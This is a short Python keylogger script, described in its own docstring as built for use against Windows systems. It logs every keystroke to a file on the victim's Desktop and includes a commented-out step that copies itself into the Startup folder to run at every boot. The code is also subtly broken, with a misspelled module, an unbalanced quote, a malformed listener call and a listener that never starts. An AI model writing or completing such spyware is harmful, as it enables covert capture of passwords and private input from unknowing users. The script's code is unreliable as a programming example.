''' 
key_logger.py

    - This script is built to be used against a windows system
    - This will log all keyboard output into a .txt file
    - This script requires Python3 & `pip3 install pynput`
    - To have the script autostart in windows un-comment the `copyfile` method
'''

import logging
import os
from pynput.keyboard import Listener

# get user login
user = os.getlogin()
# create out dir
out_dir = f"C:/Users//{user}/Desktop"
''' 
Run script on boot *windows 

  - Moves the script to the startup directory
'''

# from shututil import copyfile
# copyfile("keylogger.py, f"C:/Users/{user}/AppData/Roaming/Microsoft/Start Menu/Startup/keylogger.py")

# config logger
logging.basicConfig(filename=f"{out_dir}/keylog.txt",
                    level=logging.DEBUG,
                    format="%(asctime)s: %(message)s")


# key logger
def key_handler(key):
    # log key
    logging.info(key)
    # log confirmation
    print("Im watching")
    # while listening
    with Listener(on, press=key_handler) as listener:
        listener.join()
